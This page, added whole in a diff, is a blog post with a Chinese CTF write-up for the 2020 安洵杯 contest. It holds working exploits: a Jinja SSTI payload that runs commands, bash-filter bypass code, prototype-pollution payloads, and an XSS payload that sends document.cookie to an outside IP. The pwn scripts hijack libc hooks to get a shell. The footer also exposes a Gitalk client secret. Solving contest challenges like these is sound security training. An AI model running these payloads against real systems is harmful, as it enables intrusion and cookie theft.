@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>安洵杯Writeup |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="安洵杯Writeup |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="安洵杯Writeup"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/omqnCRpCQ/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+        </span>
+            <h1>安洵杯Writeup</h1>
+            <span class="meta">
+            	Posted on
+              2020-11-25，8 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="web">WEB</h1>
+<h2 id="bash">BASH</h2>
+<p>发现$0 = sh</p>
+<p><a href="https://hack.more.systems/writeup/2017/12/30/34c3ctf-minbashmaxfun/">https://hack.more.systems/writeup/2017/12/30/34c3ctf-minbashmaxfun/</a></p>
+<p>找到了这个</p>
+<p>这里只是1 但是1=${##}</p>
+<p>${!#} = ${0}</p>
+<p>命令执行脚本</p>
+<pre><code>import sys
+start=r&quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;&quot;
+for i in sys.argv[1]:
+    payload=str(bin(int(oct(ord(i)))))[2:].replace('1','${##}').replace('0','$#')
+    start+=r&quot;$\'\\$(($((${##}&lt;&lt;${##}))#&quot;+payload+r&quot;))\'&quot;
+print(start)
+#python exp.py &quot;ls&gt;1.txt&quot;
+</code></pre>
+<h2 id=""><img src="https://uploader.shimo.im/f/7ogwMDiVgwSCRzRt.png!thumbnail" alt="图片" loading="lazy"></h2>
+<h2 id="-2"></h2>
+<h2 id="normal">normal</h2>
+<pre><code>http://47.108.162.43:30023/test?url={%print%0a(lipsum|attr(&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;))|attr(&quot;\137\137\147\145\164\151\164\145\155\137\137&quot;)(&quot;\137\137\142\165\151\154\164\151\156\163\137\137&quot;)|attr(&quot;\137\137\147\145\164\151\164\145\155\137\137&quot;)(&quot;\145\166\141\154&quot;)(&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51&quot;)%}
+</code></pre>
+<p>%0a代替空格attr+8进制绕过</p>
+<h2 id="validator">Validator</h2>
+<p><a href="http://47.108.162.43:30023/app.js">http://47.108.162.43:30023/app.js</a></p>
+<p><a href="http://47.108.162.43:30023/package.json">http://47.108.162.43:30023/package.json</a></p>
+<pre><code class="language-plain">https://github.com/NeSE-Team/XNUCA2020Qualifier/tree/main/Web/oooooooldjs
+</code></pre>
+<p>有payload。一把梭</p>
+<pre><code class="language-plain">{&quot;info&quot;: {&quot;__proto__&quot;: {&quot;system_open&quot;: &quot;yes&quot;}}, &quot;info\&quot;].__proto__[\&quot;system_open&quot;: &quot;yes&quot;,&quot;password&quot;:&quot;D0g3_Yes!!!&quot;}
+</code></pre>
+<h2 id="easyxss">easyxss</h2>
+<p>直接原型链污染即可</p>
+<p>详细见推特<a href="https://twitter.com/S1r1u5_/status/1328371034064515077">https://twitter.com/S1r1u5_/status/1328371034064515077</a></p>
+<pre><code class="language-plain">{&quot;__proto__&quot;:{&quot;preventDefault&quot;:&quot;x&quot;,&quot;handleObj&quot;:&quot;x&quot;,&quot;delegateTarget&quot;:&quot;&lt;img/src/onerror=alert(1337)&gt;&quot;}}
+</code></pre>
+<p>所以最后是</p>
+<pre><code class="language-plain">http://47.108.162.43:3000/?data={%22__proto__%22:{%22preventDefault%22:%22x%22,%22handleObj%22:%22x%22,%22delegateTarget%22:%22%3Cimg/src/onerror=fetch(%27http://132.232.82.54:9999/?flag%3d%27%2bdocument.cookie)%3E%22}}
+</code></pre>
+<h1 id="-3"><img src="https://uploader.shimo.im/f/M3y240hDSsCEwtVV.png!thumbnail" alt="图片" loading="lazy"></h1>
+<h1 id="-4"></h1>
+<h1 id="pwn">PWN</h1>
+<h2 id="einstein">Einstein</h2>
+<p>name输入整形，泄露libc然后打exit hook即可</p>
+<pre><code class="language-python">from sys import argv
+from autopwn.core import *
+@attacker(EXP)
+def exp(self, a:pwnlib.tubes.sock.sock):
+    dbg = Debug(self)
+    dbg.b(0x000FF1, 0x1024).c()
+    payload = '{&quot;name&quot;:12232,&quot;passwd&quot;:&quot;admn&quot;}'
+    a.sla(&quot;passwd.\n&quot;, payload)
+    a.rl()
+    a.ru(&quot;logger:&quot;)
+    libc_base = unpack(a.recvn(6), 'all') - 0x3c4b78
+    a.ru(&quot;error!\n&quot;)
+    log.success(f&quot;{libc_base=:#x}&quot;)
+    target_addr = libc_base + 0x8f9f50
+    one_addr = libc_base + 0xf0364
+    dbg.attach()
+    a.send(p64(target_addr))
+    a.send(chr(p64(one_addr)[0]))
+    a.send(p64(target_addr + 1))
+    a.send(chr(p64(one_addr)[1]))
+    a.send(p64(target_addr + 2))
+    a.send(chr(p64(one_addr)[2]))
+    
+    
+    return
+@attacker(GET_FLAG)
+def get_flag(self, a:pwnlib.tubes.sock.sock):
+    a.interactive()
+    return
+inter = '../../libdb/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so'
+needed = ['../../libdb/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so', '../../libdb/libs/2.23-0ubuntu11.2_amd64/libm-2.23.so']
+ctf(argv, inter, needed)
+</code></pre>
+<h2 id="io_file">IO_FILE</h2>
+<p>借助unsorted bin遗留数据打stdout，泄露libc劫持free hook即可。需要爆破1/12</p>
+<pre><code class="language-plain">from sys import argv
+from autopwn.core import *
+@attacker(EXP)
+def exp(self, a:pwnlib.tubes.sock.sock):
+    choose = lambda x: a.sla(&quot;&gt;\n&quot;, str(x))
+    def add(size, content):
+        choose(1)
+        a.sla(&quot;size:\n&quot;, str(size))
+        a.sa(&quot;ption:&quot;, content)
+    def free(idx):
+        choose(2)
+        a.sla(&quot;index:&quot;, str(idx))
+    dbg = Debug(self)
+    dbg.cmd(&quot;ida on&quot;)
+    dbg.b(0x00400AC4, 0x000400AD0).c()
+    add(0x98, '/bin/sh\x00')
+    add(0x18, '/bin/sh\x00')
+    for i in range(0, 8):
+        free(0)
+    add(0x28, '/bin/sh\x00')
+    free(2)
+    free(2)
+    free(2)
+    add(0x28, b'\xf8')
+    free(1)
+    dbg.attach()
+    add(0x18, p64(0x0) + b'\x60\xb7')
+    add(0x28, '/bin/sh\x00')
+    add(0x28, '/bin/sh\x00')
+    try:
+        add(0x28, p64(0xfbad1800) + p64(0) * 3 + b'\x00')
+        assert(a.recvn(1) == b'\x00')
+        a.recvn(7)
+        libc_base = u64(a.recvn(8)) - 0x3b68b0
+        log.info(f&quot;{libc_base=:#x}&quot;)
+        fhook_addr = libc_base + self.lib[0].symbols['__free_hook']
+        system_addr = libc_base + self.lib[0].symbols['system']
+        
+        choose = lambda x: a.sla(&quot;&gt;&quot;, str(x))
+        def add(size, content):
+            choose(1)
+            a.sla(&quot;size:&quot;, str(size))
+            a.sa(&quot;ption:&quot;, content)
+        free(1)
+        free(1)
+        add(0x18, p64(fhook_addr - 0x8))
+        add(0x18, b'/bin/sh\x00' + p64(system_addr))
+        free(5)
+        return True
+    except:
+        return False
+    
+    return
+@attacker(GET_FLAG)
+def get_flag(self, a:pwnlib.tubes.sock.sock):
+    a.interactive()
+    return
+inter = '../../libdb/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so'
+needed = './libc.so.6'
+ctf(argv, inter, needed)
+</code></pre>
+<h2 id="web-server">Web server</h2>
+<pre><code class="language-plain">curl -i http://axb.d0g3.cn:20100/..%2f..%2fflag
+</code></pre>
+<h1 id="-5"></h1>
+<h1 id="misc">Misc</h1>
+<h2 id="签到">签到</h2>
+<p>公众号发fl1g。得到flag.docx</p>
+<p>然后<a href="https://unicode-table.com/">https://unicode-table.com/</a>查对应的unicode编码</p>
+<figure data-type="image" tabindex="1"><img src="https://uploader.shimo.im/f/ScFfT9zSltf35xpH.png!thumbnail" alt="图片" loading="lazy"></figure>
+<pre><code class="language-plain">s='3B 27 5E 2A 72 4E 5C 63 5A 27 64 56 38 45 5B 56 3F 28 4B 56 63 60 3E 5F 6B 28 70 74'
+data=s.split(' ')
+for i in data:
+  print(chr(int(i,16)+9))
+</code></pre>
+<h2 id="套娃">套娃</h2>
+<p>CRC32得到第一层密码</p>
+<p>!qQIdEa@#!z)</p>
+<p>然后readme.txt明文攻击。对应readme.txt-副本</p>
+<figure data-type="image" tabindex="2"><img src="https://uploader.shimo.im/f/sPGCcazoUknZ4KDk.png!thumbnail" alt="图片" loading="lazy"></figure>
+<p>然后解压得到base64</p>
+<p>凯撒得到Flag</p>
+<h2 id="becare">BeCare</h2>
+<p>零宽度隐写</p>
+<figure data-type="image" tabindex="3"><img src="https://uploader.shimo.im/f/doG2e0SyPwX5vKH6.png!thumbnail" alt="图片" loading="lazy"></figure>
+<p>slienteye解密</p>
+<figure data-type="image" tabindex="4"><img src="https://uploader.shimo.im/f/hDfF94ZVgWhMKIbw.png!thumbnail" alt="图片" loading="lazy"></figure>
+<h2 id="王牌特工">王牌特工</h2>
+<p>ext3。key.txt是veracrypt的加密key。但是是假的。flagbox是加密后的硬盘</p>
+<p>ext3grep 得到隐藏swp<br>
+ext3grep --inode 2 findme<br>
+ext3grep --restore-file .coolboy.swpx findme</p>
+<figure data-type="image" tabindex="5"><img src="https://uploader.shimo.im/f/I8BxnvmXf0qgFKAz.png!thumbnail" alt="图片" loading="lazy"></figure>
+<p>恢复文件得到正确的key</p>
+<figure data-type="image" tabindex="6"><img src="https://uploader.shimo.im/f/tUmNUPGek7oz8WUo.png!thumbnail" alt="图片" loading="lazy"></figure>
+<p>解密</p>
+<figure data-type="image" tabindex="7"><img src="https://uploader.shimo.im/f/erUniGV1I3Xs8wQe.png!thumbnail" alt="图片" loading="lazy"></figure>
+<h1 id="crypto">Crypto</h1>
+<h2 id="密码学爆破就行了">密码学爆破就行了</h2>
+<p>d0g3{71b2b5616ee2a4639a07d979ebde964c}</p>
+<p>爆破就好</p>
+<pre><code class="language-python">import hashlib
+p = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+p = 'abcdefghijklmnopqrstuvwxyz1234567890'
+aim = '0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a'
+broken_flag = 'd0g3{71b2b5616**2a4639**7d979**de964c}'
+a = 'd0g3{71b2b5616'
+b = '2a4639'
+c = '7d979'
+d = 'de964c}'
+for i in p:
+	print(i)
+	for j in p:
+		for k in p:
+			for l in p:
+				for m in p:
+					for n in p:
+						flag = a +i+j + b + k+l + c + m+n + d
+						if (str(hashlib.new('sha256', bytes(flag,encoding=&quot;utf8&quot;)).hexdigest())==aim):
+							print(flag)
+</code></pre>
+<p>跑了20分钟差不多就出来了</p>
+<h2 id="easy-rsa">Easy Rsa</h2>
+<p>quipqiup 还原</p>
+<p>写下exp</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+from  gmpy2 import *
+from tqdm import tqdm
+n = 10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677524091351680654318535417344913749322340318860437103597983101958967342493037991934758199221146242955689392875557192192462927253635018175615991531184323989958707271442555251694945958064367263082416655380103916187441214474502905504694440020491633862067243768930954759333735863069851757070183172950390134463839187
+c = 522627051172673216607019738378749874116772877858344748349627321977492158105699887369893079581450048789131578556338186004983533975454988450450635141267157135506032849129152411194539350100279698888357898902460651973610161382266600081865609650174137113252711515464274593530115825189780860732147803369868525723790644619452538755225868382505974710418995847979384726953915873857530098330095151094837190566851416540540805185485212577333604309698822785682707412587829684108913753204398552196441996201678339688766979634246337855516220753995430266970473808724410357458278585135750810810484678948146374963838334596646926215341
+h1 = 134805774328615624446574490322803283547316698647214138487576352482438867186094276263735342558169004773286779632939369099910639984165263724781958841009573156241531958373198729926012152201548649349842790727259831232277600944618096069835436884888782994513452252257103877595707828731260669076400456300668581565291455061609385003064649522735776446930209884653223939689686840631001863143579575759834304817613040932998629846110770749941179601474484275548912570668460216633586988225562794026430881265344731575650165992321629617982004131413202026628777742093026476064486873565664625105013298396598413667761372217260994853420062861590358
+def check(m):
+    for i in m:
+        if ord(i) &gt; 128 or ord(i) &lt; 32:
+            return 1
+    return 0
+for i in (range(54347,54348)):
+    k=i*h1-2
+    try:
+        d=invert(i,k)
+        nn = 133561991523711714238641512987809330530212246892569593026319411449791084194115873781301422593495806927875828290629679020098834182528012835469352471635087375406306534880352693134486855968468946334439553553593196889196239169351375517588892769598963002098115826389220099548938169095670740942251209102500450728442583559710183771974489284632651296188035458586935211952691589627681567274801028577256215269233875203212438263987034556969968774119389693056239796736659926866707857937025200924828822267781445721099763436020785585453958594470906716195030613615725126057391084801585533926767137218524047259398886392592317910204988634868663634415285507325190415658931169841182499733179254162060738994027842088553562013488445789594342451823783136881968032197575016845492231433684884872631894561254381663562267075103417879327236182565223877901300392217967589154857009356640377622996801781797109089687661697856930394706016954531077165127402008444818092498106642068414208190583373314287381712963712098566595399301400378116274132918572709221391531621228936206630829355801192700264684469488261781954165940553346889395507153750291402535330239420975542926664420153925171757944018621411265539452424569343708318070259746118326558005521868356304582694159507379335214599839668805877215983938986674084063185863612335339836810044252829401409522709997562887276661672718820881541500852400369184737236082178767653725044900394959369367604992512713490494168594433000695046297712977059205623777990102604073885527049867682390577577616773090662829024271568456346362315351643767420198116229892060385453123572533267805396437865025639093881944841521458804810097550625853182396288247815370818578103543117466070812804267915674186488979548392193291727228018246788487524292081389142018151246889408421936865224469589631518283230229213787648552632437566756058034131355439709320923876063030896228165897498746898125821639893238387694549304110003941329763552493326245073779912107372271854798616245416264801377068163622812994786201580895459712414134184992440395336131037558976058298521312536969408724436512019410835904564817724243688308776888170183074838453466914170790840559860531933430176605716828492670093771129301541861534595181565621644268739349035133062776852304594204220291667924128313579203359827093150911871520605180797438668872585571501531844999598674037998642821148417473110716470439750642781609483016636419373004760601783594025036152924259863627732874940148083408474700265895269165869619971810103499607445649821
+        mm = pow(c,d,n)
+        print(nn.bit_length())
+        if nn % mm != 0:
+            continue
+        print(i,mm)
+        p = 689159326758330864205993810270646658558112329195746149991184055909755461246626153920231796960903018393806410715812453949253930576368274228434916375544579284365205241766136566047482065208442992856658212126772417415403473480889927931481129434854332858754668120563818975006384512615022532233244596546830392476321031156328699572283946257730515089543367929326280871305776349305346159311591820455943842203357066465523558715870586535188343603460826231817622511283563179065036619023415848694281294463836320838105950552498785365535923041927491743402053568747113507098917091780797009380675587381805253390649630338055131031679595664055361678114747608302944715308343764678875659039394225950479683967885912291399162609094622980318391045105733088508798371414996479107970975717563552614856114065668728607215268431341079233630995168600896375314067716366181300081684353583326214062788182429536300917720999423489104723824360299238754986351169209709892739317096741609428484854087163771300777717883057028145424827875496235567904291417092378448353222179114362314382900648079547647848024440220204768433974038004942869937932015294078073975703156613070125753344841550872429670559866184492945262960524545894823245933714684747784492095876370443994948425495841
+        c = 65553658155452064459040687299632299415295760116470555100400688788937893101658136830409082198753928673469636810831761104117535054304536941814523449491308187105740319828511969750359402834799486354958723098881095067882833993358468923611118977258293638107874383059048015701807718209929028151240509801801995570592890519253676774278321334154528938199389248563657673061299152526380072934917964488153875744843855913524788571997024947738868563951687976817548296078497817264410193882661874749304071168979787307490320366615899942861059615405569154961435894469325778407081182151320629413711622905703628430999201763846682516985530373643176026602901129520439581385946775511292435206913016381293219606333035648747877313424616408338829137581998558399694071257787294948211441360283876078405831210625321012072477187438320944119825970347654743794743846351762763177440045084761025728597526592892602263484022280653040195670941221493307430623213388669939114424884078502946247136016528925968280034099568454876076717790529204207317485416329062672971939549478648687894958552760953682796211975576320713576155031581257782352223857605149825435939889497465805857339911597479498085071301601506276220487493620870555545057189236870008182212284992968466451864806648279032294546676543599599279519394341289357968292292966055189578253350591765186079486142930848439238134776982658066494378507873003509820326863340562093906137812952544399266821679905073464535234547335867090392493005792528534561846391285698943396889671437127470587837989050518266365099789392584686615435440486086402941357614369171354355307532351370775920044953381482310949663868493911752104873824099597326393857349237228788875273525189373323552519106738497767546337587947368062413334887230166285909705065920918078052826480092129173127887307158867274895914733110276134124505178182548094607594799978378381804502097507167978950926067243870989514735314054362049917668015341349933704885009878192354865067520219676784278082055728039064858769077997521541853184489175120623176481708269464933868222226748491078319156602229948646960513946846417957356535995079525993783278312017766715177078804065822913241465133977233398851120059496221650357891946344151601586169979516826622503491746992282716591488199657450776596383692706657692673860134555990821730412919497018889046615548520878486492644159735144935329502984929679831356967030870226422768447430410031028770529758721438528263719267616233686813781828066547393953352033364851486926368090757420184816634373721
+        q=nn//p//mm
+        print(isPrime(q))
+        phi=2*(mm//3-1)*(p-1)*(q-1)
+        dd=invert(0x10001,phi)
+        print(long_to_bytes(pow(c,dd,nn)))
+        n = 14857387925078594782296815160632343246361073432459148990826882280149636079353743233970188012712079179396872746334143946166398665205889211414809061990804629906990919975187761209638578624750977626427334126665295876888197889611807587476285991599511809796600855689969285611439780660503760599419522224129074956376232480894299044645423966132497814477710701209588359243945406653547034819927990978087967107865071898215805154003530311865483912924517801551052430227039259201082691698480830966567550828053196299423168934840697637891311424286534363837640448614727396254288829197614805073711893711252067987576745683317789020760081
+        print(n.bit_length())
+        c = 14035143725862612299576867857272911865951893239411969382153274945929406881665641140566462510177132511558933111728871930062074990934496715765999564244916409345156132996227113853067808126894818934327468582686975383715892108247084995817427624992232755966398834682079985297050358462588989699096264155802168300026093598601350106309023915300973067720164567785360383234519093637882582163398344514810028120555511836375795523327469278186235781844951253058134566846816114359878325011207064300185611905609820210904126312524631330083758585084521500322528017455972299008481301204209945411774541553636405290572228575790342839240414
+        e = 5
+        print(long_to_bytes(11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047675003330981130439478093707252121278358852500850751357))
+    except:
+        pass
+'''
+n = 14857387925078594782296815160632343246361073432459148990826882280149636079353743233970188012712079179396872746334143946166398665205889211414809061990804629906990919975187761209638578624750977626427334126665295876888197889611807587476285991599511809796600855689969285611439780660503760599419522224129074956376232480894299044645423966132497814477710701209588359243945406653547034819927990978087967107865071898215805154003530311865483912924517801551052430227039259201082691698480830966567550828053196299423168934840697637891311424286534363837640448614727396254288829197614805073711893711252067987576745683317789020760081
+c = 14035143725862612299576867857272911865951893239411969382153274945929406881665641140566462510177132511558933111728871930062074990934496715765999564244916409345156132996227113853067808126894818934327468582686975383715892108247084995817427624992232755966398834682079985297050358462588989699096264155802168300026093598601350106309023915300973067720164567785360383234519093637882582163398344514810028120555511836375795523327469278186235781844951253058134566846816114359878325011207064300185611905609820210904126312524631330083758585084521500322528017455972299008481301204209945411774541553636405290572228575790342839240414
+e = 5
+mbar = 11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047
+print(bin(mbar))
+kbits = 200
+print(kbits)
+beta = 1
+nbits = n.nbits()
+print(&quot;upper {} bits of {} bits is given&quot;.format(nbits - kbits, nbits))
+PR.&lt;x&gt; = PolynomialRing(Zmod(n))
+f = (mbar*10**54 + x)^e - c
+x0 = f.small_roots(X=10**55, beta=1)[0]  # find root &lt; 2^kbits with factor = n
+print(x0)
+'''
+</code></pre>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/9hyMr91LW/">
+              <span class="post-title">
+                NCTF(ezphp)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
